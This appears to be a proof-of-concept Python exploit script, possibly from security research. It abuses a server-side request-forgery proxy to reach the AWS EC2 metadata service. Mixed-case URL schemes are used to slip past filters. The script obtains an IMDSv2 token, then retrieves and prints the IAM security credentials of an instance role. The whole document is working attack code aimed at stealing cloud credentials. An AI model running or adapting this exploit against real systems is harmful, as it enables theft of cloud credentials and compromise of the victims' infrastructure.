import requests
import sys
proxy = sys.argv[1]
token = requests.post(proxy, json={
    "host": "https://bishopfox.com/", "url": "hTtp://169.254.169.254/latest/api/token/",
    "method": "PUT", "headers": {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
}).text
credentials = requests.post(proxy, json={
    "host": "https://bishopfox.com/", "url": "HtTp://169.254.169.254/latest/meta-data/iam/security-credentials/node-role",
    "method": "GET", "headers": {"X-aws-ec2-metadata-token": token}
}).text
print(credentials)
